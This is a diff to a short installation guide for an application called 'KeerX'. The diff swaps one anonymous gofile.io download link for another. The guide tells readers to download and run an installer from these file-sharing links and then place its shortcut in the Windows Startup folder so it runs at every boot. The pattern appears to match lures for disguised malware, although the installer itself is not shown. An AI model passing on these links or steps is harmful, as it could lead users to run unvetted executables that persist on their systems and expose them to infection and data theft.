@@ -4,7 +4,7 @@ Please follow these steps to get the application running on your system:
 1. Download and Install
 Click the link below to download the application installer: 👉 https://gofile.io/d/cYJBmz
 https://gofile.io/d/6iGRmq
-KeerX:https://gofile.io/d/uKyNvn
+KeerX:https://gofile.io/d/omBYJy
 Download the file to your Downloads folder.
 
 Run the installer and follow the on-screen prompts to complete the installation.
@@ -24,4 +24,5 @@ Right-click on your app's desktop icon and select Copy.
 
 
 Right-click inside the Startup folder you just opened and select Paste shortcut.
+
 
